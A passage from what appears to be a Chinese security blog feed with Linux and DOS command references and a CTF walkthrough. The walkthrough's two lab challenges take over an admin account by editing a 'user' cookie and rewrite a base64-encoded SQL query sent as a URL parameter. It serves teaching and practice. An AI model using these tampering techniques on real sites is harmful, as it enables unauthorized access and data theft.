filename</span><br><span class="line">#例如：</span><br><span class="line">file ./test</span><br></pre></td></tr></table></figure><p>##1.12 tar命令</p><p>该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-c ：新建打包文件</span><br><span class="line">-t ：查看打包文件的内容含有哪些文件名</span><br><span class="line">-x ：解打包或解压缩的功能，可以搭配-C（大写）指定解压的目录，注意-c,-t,-x不能同时出现在同一条命令中</span><br><span class="line">-j ：通过bzip2的支持进行压缩/解压缩</span><br><span class="line">-z ：通过gzip的支持进行压缩/解压缩</span><br><span class="line">-v ：在压缩/解压缩过程中，将正在处理的文件名显示出来</span><br><span class="line">-f filename ：filename为要处理的文件</span><br><span class="line">-C dir ：指定压缩/解压缩的目录dir</span><br></pre></td></tr></table></figure><p>虽然命令的参数很多，但是常用的只有3条</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称</span><br><span class="line">查询：tar -jtv -f filename.tar.bz2</span><br><span class="line">解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录</span><br></pre></td></tr></table></figure><blockquote><p>ps：文件名并不定要以后缀tar.bz2结尾，这里主要是为了说明使用的压缩程序为bzip2</p></blockquote><h2 id="1-13-cat命令"><a href="#1-13-cat命令" class="headerlink" title="1.13 cat命令"></a>1.13 cat命令</h2><p>该命令用于查看文本文件的内容，后接要查看的文件名，通常可用管道与more和less一起使用，从而可以一页页地查看数据。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat text | less # 查看text文件中的内容</span><br><span class="line"># 注：这条命令也可以使用less text来代替</span><br></pre></td></tr></table></figure><h2 id="1-14-chgrp命令"><a href="#1-14-chgrp命令" class="headerlink" title="1.14 chgrp命令"></a>1.14 chgrp命令</h2><p>该命令用于改变文件所属用户组，它的使用非常简单，它的基本用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chgrp [-R] dirname/filename</span><br><span class="line">-R ：进行递归的持续对所有文件和子目录更改</span><br><span class="line"># 例如：</span><br><span class="line">chgrp users -R ./dir # 递归地把dir目录下中的所有文件和子目录下所有文件的用户组修改为users</span><br></pre></td></tr></table></figure><h2 id="1-15-chown命令"><a href="#1-15-chown命令" class="headerlink" title="1.15 chown命令"></a>1.15 chown命令</h2><p>该命令用于改变文件的所有者，与chgrp命令的使用方法相同，只是修改的文件属性不同，不再详述。</p><h2 id="1-16-chmod命令"><a href="#1-16-chmod命令" class="headerlink" title="1.16 chmod命令"></a>1.16 chmod命令</h2><p>该命令用于改变文件的权限，一般的用法如下：</p><blockquote><p>语法：chmod [-R] xyz 文件或目录</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-R：进行递归的持续更改，即连同子目录下的所有文件都会更改</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 0755 file # 把file的文件权限改变为-rxwr-xr-x</span><br><span class="line">chmod g+w file # 向file的文件权限中加入用户组可写权限</span><br></pre></td></tr></table></figure><h2 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h2><h2 id="1-18-vim命令"><a href="#1-18-vim命令" class="headerlink" title="1.18 vim命令"></a>1.18 vim命令</h2><p>该命令主要用于文本编辑，它接一个或多个文件名作为参数，如果文件存在就打开，如果文件不存在就以该文件名创建一个文件。vim是一个非常好用的文本编辑器，它里面有很多非常好用的命令，在这里不再多说。你可以从这里下载<a href="http://download.csdn.net/detail/ljianhui/6215287" target="_blank" rel="noopener">vim常用操作</a>的详细说明。</p><h2 id="1-19-gcc命令"><a href="#1-19-gcc命令" class="headerlink" title="1.19 gcc命令"></a>1.19 gcc命令</h2><p>对于一个用Linux开发C程序的人来说，这个命令就非常重要了，它用于把C语言的源程序文件，编译成可执行程序，由于g++的很多参数跟它非常相似，所以这里只介绍gcc的参数，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-o ：output之意，用于指定生成一个可执行文件的文件名</span><br><span class="line">-c ：用于把源文件生成目标文件（.o)，并阻止编译器创建一个完整的程序</span><br><span class="line">-I ：增加编译时搜索头文件的路径</span><br><span class="line">-L ：增加编译时搜索静态连接库的路径</span><br><span class="line">-S ：把源文件生成汇编代码文件</span><br><span class="line">-lm：表示标准库的目录中名为libm.a的函数库</span><br><span class="line">-lpthread ：连接NPTL实现的线程库</span><br><span class="line">-std= ：用于指定把使用的C语言的版本</span><br><span class="line"> </span><br><span class="line"># 例如：</span><br><span class="line"># 把源文件test.c按照c99标准编译成可执行程序test</span><br><span class="line">gcc -o test test.c -lm -std=c99</span><br><span class="line">#把源文件test.c转换为相应的汇编程序源文件test.s</span><br><span class="line">gcc -S test.c</span><br></pre></td></tr></table></figure><h2 id="1-20-time命令"><a href="#1-20-time命令" class="headerlink" title="1.20 time命令"></a>1.20 time命令</h2><p>该命令用于测算一个命令（即程序）的执行时间。它的使用非常简单，就像平时输入命令一样，不过在命令的前面加入一个time即可，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">time ./process</span><br><span class="line">time ps aux</span><br></pre></td></tr></table></figure><p>在程序或命令运行结束后，在最后输出了三个时间，它们分别是：<br>user：用户CPU时间，命令执行完成花费的用户CPU时间，即命令在用户态中执行时间总和；<br>system：系统CPU时间，命令执行完成花费的系统CPU时间，即命令在核心态中执行时间总和；<br>real：实际时间，从command命令行开始执行到运行终止的消逝时间；</p><p>注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。</p><h1 id="0x02-转载链接"><a href="#0x02-转载链接" class="headerlink" title="0x02 转载链接"></a>0x02 转载链接</h1><p><a href="https://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">https://blog.csdn.net/ljianhui/article/details/11100625/</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Linux在渗透测试和安全运维的工作中都会经常使用，但是命令太多，作为一个普通的人类是不可能全部都记住的。所以在这里整理一个Linux命令的文档来方便自己日后查看。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.mad-coding.cn/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>基础DOS命令</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80DOS%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础DOS命令/</id>
    <published>2019-09-05T03:15:17.000Z</published>
    <updated>2019-09-05T03:40:17.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在进行渗透测试的过程中，不免会用到DOS系统下的一些命令，所以这篇文章将常用的DOS命令进行整理归纳，方便他人学习和自己查看。</p><a id="more"></a><h1 id="0x01-常用命令归纳"><a href="#0x01-常用命令归纳" class="headerlink" title="0x01 常用命令归纳"></a>0x01 常用命令归纳</h1><h2 id="1-1-dir"><a href="#1-1-dir" class="headerlink" title="1.1 dir"></a>1.1 dir</h2><p>dir是英文单词directory(目录）的缩写，主要用来显示一个目录下的文件和子目录。 </p><blockquote><p>[功能] 显示指定磁盘、目录中的文件和子目录信息，包括文件及子目录所在磁盘的卷标、文件与子目录的名称、每个文件的大小、文件及目录建立的日期时间，以及文件子目录的个数、所占用总字节数以及磁盘上的剩余总空间等信息。 </p></blockquote><blockquote><p>[格式] dir [C:][path][filename][.ext][/o][/s][/p][/w][/a] </p></blockquote><blockquote><p>[说明] dir是DOS命令中最常用的一个。斜杠表示后面的内容是参数。DOS参数最常用的是以下四个：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">参 数 意 义 :</span><br><span class="line">/p </span><br><span class="line">显示信息满一屏时，暂停显示，按任意键后显示下一屏 </span><br><span class="line"></span><br><span class="line">/o </span><br><span class="line">排序显示。o后面可以接不同意义的字母 </span><br><span class="line"></span><br><span class="line">/w </span><br><span class="line">只显示文件名目录名，每行五个文件名。即宽行显示 </span><br><span class="line"></span><br><span class="line">/s </span><br><span class="line">将目录及子目录的全部目录文件都显示 </span><br><span class="line">/a </span><br><span class="line">显示隐藏文件</span><br></pre></td></tr></table></figure><blockquote><p>[举例] 显示C:\WINDOWS\Desktop文件夹里面的信息 </p></blockquote><h2 id="1-2-md"><a href="#1-2-md" class="headerlink" title="1.2 md"></a>1.2 md</h2><p>md是英文make directory（创建目录）的缩写 </p><blockquote><p>[功能] 创建一个子目录 </p></blockquote><blockquote><p>[格式] md [C:]path </p></blockquote><blockquote><p>[举例] 用md 建立一个叫做purple的目录 </p></blockquote><h2 id="1-3-cd"><a href="#1-3-cd" class="headerlink" title="1.3 cd"></a>1.3 cd</h2><p>cd是英文change directory(改变目录）的缩写 </p><blockquote><p>[功能] 改变或显示当前目录 </p></blockquote><blockquote><p>[格式] cd [C:][path] </p></blockquote><blockquote><p>[说明] 路径可以使用绝对路径和相对路径两种。如果只有cd而没有参数，则只显示当前路径。注意：子目录中一定有两个“特殊目录”，即“.”“..”，其中一点表示当前目录，两点表示上一层目录。从简单实用的角度来看，我们只要学会逐层进入（cd 下一层某目录名），和逐层退出（cd..）就可以解决所有问题。当然也可以用绝对路径的办法。 </p></blockquote><blockquote><p>[举例] 进入我们刚才建立的purple目录 </p></blockquote><h2 id="1-4-rd"><a href="#1-4-rd" class="headerlink" title="1.4 rd"></a>1.4 rd</h2><p>remove directory–删除目录 </p><blockquote><p>[功能] 删除空子目录 </p></blockquote><blockquote><p>[格式] rd [d:]path </p></blockquote><blockquote><p>[说明] rd是专门删除空子目录的命令。注意两条：一是不能删除非空目录；二是不能删除当前目录。 </p></blockquote><blockquote><p>[举例] 用rd删除purple这个目录 </p></blockquote><p>下面我们来运用md, cd, rd这三个命令。 </p><h2 id="1-5-copy"><a href="#1-5-copy" class="headerlink" title="1.5 copy"></a>1.5 copy</h2><p>copy在英文中是复制的意思 </p><blockquote><p>[功能] 复制一个或一组文件到指定的磁盘或目录中 </p></blockquote><blockquote><p>[格式] copy [C:][path][filename.ext] [C:][path]filename.ext </p></blockquote><blockquote><p>[说明] 复制文件命令基本用法是：“复制 源文件名 目标文件名”。如果只写目标路径而不写目标文件名，表示同名复制；否则称为换名复制。注意换名复制一般不要更改文件扩展名。 </p></blockquote><blockquote><p>[举例] 将C:\purple目录的所有文件复制到软盘，可以打如下命令，请注意当前盘与当前路径不同： </p></blockquote><p>C:&gt;copy purple A:\ </p><p>如果目标盘上已有同名文件，会出现如下提示，“Overwrite xxxx(Yes/No/All)”此时回答Y则覆盖当前文件，N则保留，A则覆盖此后的所有文件而不再提问。 </p><h2 id="1-6-del"><a href="#1-6-del" class="headerlink" title="1.6 del"></a>1.6 del</h2><p>del是英文delete（删除）的缩写 </p><blockquote><p>[功能] 删除指定磁盘、目录中的一个或一组文件 </p></blockquote><blockquote><p>[格式] del [C:][path]filename.ext </p></blockquote><blockquote><p>[说明] 这个命令应小心使用。一旦被删除，将不易恢复。同样可以采用通配符为删除一类文件。当利用<em>.</em>时，为了安全将给出警告，确定方进行删除工作。删除过程如没有信息提示，表示已正确删除。 </p></blockquote><p>注意这个命令不能删除具有只读、隐含、系统属性的文件；如果指定文件不存在，则出现“File not found”的提示；DOS对误删除的文件可以用UNDELETE外部命令恢复；它<strong>只能删文件，不能删目录</strong>。 </p><h2 id="1-7-ren"><a href="#1-7-ren" class="headerlink" title="1.7 ren"></a>1.7 ren</h2><p>ren是英文rename（重新命名）的简写 </p><blockquote><p>[功能] 对指定磁盘、目录中的一个文件或一组文件更改名称 </p></blockquote><blockquote><p>[格式] ren [C:][path]filename1[.ext] filename2[.ext] </p></blockquote><blockquote><p>[说明] 改名操作只限于某个文件某组文件的名称，它不会更改文件所在的目录。 </p></blockquote><p>如果使用了通配符，则对一批文件进行更名。 </p><h2 id="1-8-type"><a href="#1-8-type" class="headerlink" title="1.8 type"></a>1.8 type</h2><blockquote><p>[功能] 在屏幕上显示文本文件内容命令 </p></blockquote><blockquote><p>[格式] type [C:][path]filename.ext </p></blockquote><blockquote><p>[说明] type命令用来在屏幕上快速、简便地显示文本文件的内容，扩展名为TXT的文件是文本文件。 </p></blockquote><p>如果用这个命令显示扩展名为EXE或COM等其它文件， 输出的结果往往是一些乱七八糟的符号并伴有无规则的响铃声，有时甚至会出现死机现象。 </p><h2 id="1-9-format"><a href="#1-9-format" class="headerlink" title="1.9 format"></a>1.9 format</h2><blockquote><p>[功能] 磁盘格式化 </p></blockquote><blockquote><p>[格式] [C:][path]format drive:[/S] </p></blockquote><blockquote><p>[说明] 厂家制造的各种磁盘可用来存储各种操作系统下的文件。不同操作系统的磁盘格式一般是不相同的，是不通用的。format命令就是使一个新的磁盘可以被DOS操作系统识别，即可存储DOS文件。 </p></blockquote><p>这个命令对磁盘的格式化过程，实际上是用DOS规定的信息存储格式对磁盘进行规划的过程。格式化磁盘时，要清除磁盘上已经存在的所有数据，在磁盘上写上引导记录，划分出文件分配表和根目录，同时，它还要找出磁盘上的所有坏扇区并作上不可使用的标记。命令参数我们这里只列出了一个：/S。当使用了这个参数后，磁盘格式化并装入操作系统文件，使之变成引导盘。相当于format后再进行下一命令：SYS。 </p><h2 id="1-10-discopy"><a href="#1-10-discopy" class="headerlink" title="1.10 discopy"></a>1.10 discopy</h2><p>diskcopy，翻译成中文就是磁盘复制 </p><blockquote><p>[功能] 复制出一个和原来磁盘内容一模一样的磁盘 </p></blockquote><blockquote><p>[格式] diskcopy　源驱动器名　目的驱动器名 </p></blockquote><blockquote><p>[说明] 它的主要用途就是用来备份。比如我们的电脑在刚买来时，会随机附带一些设备驱动程序磁盘，这些驱动程序在以后都有可能用到，为防止这些磁盘的损坏，一定要将它们都备份一套，这时，使用diskcopy命令是比较快捷和方便的。 </p></blockquote><h2 id="1-11-deltree"><a href="#1-11-deltree" class="headerlink" title="1.11 deltree"></a>1.11 deltree</h2><blockquote><p>[功能] 删除目录树 </p></blockquote><blockquote><p>[格式] [C:][path]DELTREE [C1:][path1] [[C2:][path2] […]] </p></blockquote><blockquote><p>[说明] 这个命令将整个指定目录树全部消灭，而不管它是否是只读、隐藏与否。使用应特别小心。它是一个危险命令。 </p></blockquote><h2 id="1-12-mem"><a href="#1-12-mem" class="headerlink" title="1.12 mem"></a>1.12 mem</h2><p>mem是memory的缩写 </p><blockquote><p>[功能] 该命令用来查看你的计算机内存有多少，以及内存的使用情况。 </p></blockquote><blockquote><p>[格式] 直接键入mem命令 </p></blockquote><h2 id="1-13-chkdsk"><a href="#1-13-chkdsk" class="headerlink" title="1.13 chkdsk"></a>1.13 chkdsk</h2><p>chkdsk是check disk的缩写。 </p><blockquote><p>[功能] 用来检查你的磁盘的使用情况。 </p></blockquote><blockquote><p>[格式] chkdsk　磁盘名 </p></blockquote><blockquote><p>[说明] 例如要检查A盘使用情况，就输入chkdsk　A: ，检查c盘使用情况，就输入chkdsk　C: ，如果直接输入chkdsk，就检查当前磁盘的使用情况。 </p></blockquote><h2 id="1-14-sys"><a href="#1-14-sys" class="headerlink" title="1.14 sys"></a>1.14 sys</h2><blockquote><p>[功能] 传递系统文件命令。将DOS的两个隐含的系统IO.SYS和MSDOS.SYS传送到目标磁盘的特定位置上，并将COMMAND.COM文件复制过去。完成后，目标盘成为DOS的启动盘。 </p></blockquote><blockquote><p>[格式] [C:][path]SYS [C1:][path] d2: </p></blockquote><blockquote><p>[说明] 由于这几个文件需要复制到特定位置上，所以用COPY命令完成的复制未必能够启动机器。能过SYS命令，DOS可以将目标盘已占据特定位置的文件移动，并将系统文件复制到相应位置上。参数C1ath用来指明系统文件所在目录。如不指明，则缺省为当前盘的当前目录。所以这个命令一般要在源盘的根目录进行。 </p></blockquote><h2 id="1-15-path"><a href="#1-15-path" class="headerlink" title="1.15 path"></a>1.15 path</h2><blockquote><p>[功能] 设定DOS寻找.COM、.EXE、.BAT文件的所在目录 </p></blockquote><blockquote><p>[格式] path=[[drive:]path[;…]]或path </p></blockquote><h2 id="1-16-edit"><a href="#1-16-edit" class="headerlink" title="1.16 edit"></a>1.16 edit</h2><blockquote><p>[功能] edit命令是一个简单的编辑软件，我们经常用它来编辑一些程序和批处理文件。 </p></blockquote><h2 id="1-17-cls"><a href="#1-17-cls" class="headerlink" title="1.17 cls"></a>1.17 cls</h2><blockquote><p>[功能] 清除显示器屏幕上的内容，使DOS提示符到屏幕左上角。 </p></blockquote><blockquote><p>[格式] cls </p></blockquote><h2 id="1-18-time"><a href="#1-18-time" class="headerlink" title="1.18 time"></a>1.18 time</h2><blockquote><p>[功能] 显示和设置DOS的系统时间 </p></blockquote><blockquote><p>[格式] time [hh[:mm[:ss[.cc]]] </p></blockquote><h2 id="1-19-date"><a href="#1-19-date" class="headerlink" title="1.19 date"></a>1.19 date</h2><blockquote><p>[功能] 显示和设置DOS的系统日期 </p></blockquote><blockquote><p>[格式] date [MM-DD-YY] </p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190905113441.png" class="lozad"></p><h2 id="1-20-ver"><a href="#1-20-ver" class="headerlink" title="1.20 ver"></a>1.20 ver</h2><blockquote><p>[功能] 显示正在运行的DOS系统版本号 </p></blockquote><blockquote><p>[格式] ver </p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190905113506.png" class="lozad"></p><h1 id="0x02-其他命令"><a href="#0x02-其他命令" class="headerlink" title="0x02 其他命令"></a>0x02 其他命令</h1><p>attrib…………设置文件属性<br>ctty …………改变控制设备<br>defrag…………磁盘碎片整理<br>doskey…………调用和建立DOS宏命令<br>debug …………程序调试命令<br>emm386…………扩展内存管理<br>fc　　…………文件比较<br>fdisk …………硬盘分区<br>lh/loadhigh …将程序装入高端内存<br>move …………移动文件，改目录名<br>more　…………分屏显示<br>prompt…………设置提示符<br>set 　…………设置环境变量<br>smartdrv………设置磁盘加速器<br>setver…………设置版本<br>subst …………路径替换<br>vol　 …………显示指定的磁盘卷标号<br>xcopy …………拷贝目录和文</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在进行渗透测试的过程中，不免会用到DOS系统下的一些命令，所以这篇文章将常用的DOS命令进行整理归纳，方便他人学习和自己查看。&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://www.mad-coding.cn/categories/Windows/"/>
    
    
      <category term="基础教程" scheme="https://www.mad-coding.cn/tags/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    
      <category term="DOS命令" scheme="https://www.mad-coding.cn/tags/DOS%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>CTF考试用题</title>
    <link href="https://www.mad-coding.cn/2019/09/05/CTF%E8%80%83%E8%AF%95%E7%94%A8%E9%A2%98/"/>
    <id>https://www.mad-coding.cn/2019/09/05/CTF考试用题/</id>
    <published>2019-09-05T03:07:56.000Z</published>
    <updated>2019-09-05T03:14:36.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文是将CTF考题进行整理归纳，方便自己和他人学习使用，有疑问的朋友可以在文章末尾留言交流。</p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文是将CTF考题进行整理归纳，方便自己和他人学习使用，有疑问的朋友可以在文章末尾留言交流。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF竞赛试题（跟新中）</title>
    <link href="https://www.mad-coding.cn/2019/09/03/CTF%E7%AB%9E%E8%B5%9B%E8%AF%95%E9%A2%98/"/>
    <id>https://www.mad-coding.cn/2019/09/03/CTF竞赛试题/</id>
    <published>2019-09-03T13:30:27.000Z</published>
    <updated>2019-09-11T12:42:17.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01-第一关-不合理的验证方式"><a href="#0x01-第一关-不合理的验证方式" class="headerlink" title="0x01 第一关-不合理的验证方式"></a>0x01 第一关-不合理的验证方式</h1><h2 id="1-1-题目背景"><a href="#1-1-题目背景" class="headerlink" title="1.1 题目背景"></a>1.1 题目背景</h2><p>Web 用户的身份验证，及页面操作权限验证是 B/S 系统的基础功能，一个功<br>能复杂的业务应用系统，通过角色授权来控制用户访问。Web 系统的用户登录<br>及页面操作权限验证在处理逻辑上比较复杂，通过 Session 和 Cookie 存储，以及<br>Session 和 Cookie 的过期处理来控制用户身份 。</p><h2 id="1-2-题目描述"><a href="#1-2-题目描述" class="headerlink" title="1.2  题目描述"></a>1.2  题目描述</h2><p>一个 web 系统中管理员账户：admin 中有一串 key，页面只提供了试用账号<br>密码：test test ，我们需要登录进 admin 账户获取 key 来通过本关。</p><h2 id="1-3-答案提交"><a href="#1-3-答案提交" class="headerlink" title="1.3 答案提交"></a>1.3 答案提交</h2><ol><li>提交得到的 key。</li><li>请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD<br>方式提交。</li></ol><h2 id="1-4-提交key"><a href="#1-4-提交key" class="headerlink" title="1.4 提交key"></a>1.4 提交key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key：I am admin</span><br></pre></td></tr></table></figure><h2 id="1-5-关卡环境"><a href="#1-5-关卡环境" class="headerlink" title="1.5 关卡环境"></a>1.5 关卡环境</h2><ol><li><p>VPC1( 虚拟 PC ）:工具场景：Windows XP 操作系统/BT5</p></li><li><p>VPC2( 虚拟 PC ）:Window server xp</p></li><li><p>软件描述:使用工具场景集成的工具软件，参赛者也可以上传工具软<br>件软件到工具场景</p></li><li><p>关卡环境描述:</p><ol><li>学生机与实验室网络直连</li><li>VPC 与实验室网络直连</li><li>学生机与 VPC 物理链路连通</li></ol></li></ol><h2 id="1-6-参考步骤"><a href="#1-6-参考步骤" class="headerlink" title="1.6 参考步骤"></a>1.6 参考步骤</h2><p>1.打开浏览器，访问 <a href="http://192.168.102.62。" target="_blank" rel="noopener">http://192.168.102.62。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213809.png" class="lozad"></p><p>2.使用账号密码：test test 登录</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213844.png" class="lozad"></p><p>3.使用 Firefox 的 firebug 插件查看 cookies。发现只有 user 段，值为 test。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213904.png" class="lozad"></p><p>4.将 test 修改为 admin，再次访问页面，得到 key：I am admin</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213933.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213949.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214009.png" class="lozad"></p><p>Cookie：判断用户信息的凭据，存储在本地</p><p>Test 用户登录产生的 cookie 信息：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214042.png" class="lozad"></p><h1 id="0x02-加密与解密的对抗"><a href="#0x02-加密与解密的对抗" class="headerlink" title="0x02 加密与解密的对抗"></a>0x02 加密与解密的对抗</h1><h2 id="2-1-题目背景"><a href="#2-1-题目背景" class="headerlink" title="2.1 题目背景"></a>2.1 题目背景</h2><p>数据加密的基本过程就是对原来为明文的文件或数据按某种算法进<br>行处理，使其成为不可读的一段代码，通常称为“<strong>密文</strong>”，使其只能在<br>输入相应的密钥之后才能显示出本来内容，通过这样的途径来达到保护<br>数据不被非法人窃取、阅读的目的。 该过程的逆过程为解密，即将该<br>编码信息转化为其原来数据的过程</p><h2 id="2-2-题目描述"><a href="#2-2-题目描述" class="headerlink" title="2.2 题目描述"></a>2.2 题目描述</h2><p>一个 web 页面只给了 2 个奇怪的超链接，访问 2 个连接会导致列表的排序不<br>一样。这一关通过观察页面，构造 url，访问得到 key 通过本关。</p><h2 id="2-3-答案提交"><a href="#2-3-答案提交" class="headerlink" title="2.3 答案提交"></a>2.3 答案提交</h2><ol><li>提交得到的 key。</li><li>请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD<br>方式提交。</li></ol><h2 id="2-4-提交key"><a href="#2-4-提交key" class="headerlink" title="2.4 提交key"></a>2.4 提交key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:hello world</span><br></pre></td></tr></table></figure><h2 id="2-5-关卡环境"><a href="#2-5-关卡环境" class="headerlink" title="2.5 关卡环境"></a>2.5 关卡环境</h2><ol><li>VPC1( 虚拟 PC ） 工具场景：Windows XP 操作系统/BT5</li><li>VPC2( 虚拟 PC ）: Window server xp</li><li>软件描述:使用工具场景集成的工具软件，参赛者也可以上传工具软件软件到工具场景。</li><li>关卡环境描述:<ol><li>学生机与实验室网络直连</li><li>VPC 与实验室网络直连</li><li>学生机与 VPC 物理链路连通</li></ol></li></ol><h2 id="2-6-参考步骤"><a href="#2-6-参考步骤" class="headerlink" title="2.6 参考步骤"></a>2.6 参考步骤</h2><p>1.打开浏览器，访问 <a href="http://192.168.102.62。" target="_blank" rel="noopener">http://192.168.102.62。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214542.png" class="lozad"></p><p>2.通过查看源码，查看 2 个超链接的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?word=U0VMRUNUKyUyQStGUk9NK2xhbmd1YWdlK29yZGVyK2J5K3JhbmtpbmcrbGltaXQrMCUyQzQ=</span><br><span class="line"></span><br><span class="line">index.php?word=U0VMRUNUKyUyQStGUk9NK2xhbmd1YWdlK29yZGVyK2J5K3llYXIrbGltaXQrMCUyQzQ=</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214648.png" class="lozad"></p><p>3.2 个地址的 Word 参数是 base64 加密，将其解密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214808.png" class="lozad"></p><p>4.解密后的字符串：<br><code>SELECT+%2A+FROM+language+order+by+year+limit+0%2C4</code><br>是 <code>url</code> 加密，再次解密：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214841.png" class="lozad"></p><p>5.解密结果是一个 sql 语句。构造新的语句：<br>SELECT * FROM language order by year<br>将其 url 加密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214904.png" class="lozad"></p><p>6.将得到的字符串 base64 加密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214932.png" 